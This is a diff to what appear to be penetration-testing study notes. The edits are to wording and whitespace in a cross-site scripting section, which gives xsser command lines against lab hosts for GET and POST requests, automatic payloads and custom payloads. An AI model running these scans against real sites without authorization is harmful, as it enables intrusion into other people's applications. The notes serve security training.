@@ -63,7 +63,7 @@ whatweb $TARGET_URL
 
 # XSS
 
-Test all user input to render HTML placing tags or execute JavaScript code with the `<script>` tag.
+Test all user inputs to render HTML placing tags or execute JavaScript code with the `<script>` tag.
 
 ## XSSER
 
@@ -82,10 +82,7 @@ xsser --url 'http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choi
 
 
   
-  
 ### POST REQUEST
-
-  
 
 Get the request parameters and use the -p flag to set the reflection points
 
@@ -96,8 +93,7 @@ xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XS
 
 ### AUTOMATIC PAYLOAD
 
-
-Append the –auto switch
+Append the `–auto` flag
 
 ```shell
 xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' –auto
@@ -106,7 +102,6 @@ xsser --url 'http://VULNERABLE/index.php?page=dns-lookup.php' -p 'target_host=XS
 
 ### CUSTOM PAYLOAD
 
-  
 Append the –Fp switch with the custom payload
 
 ```shell
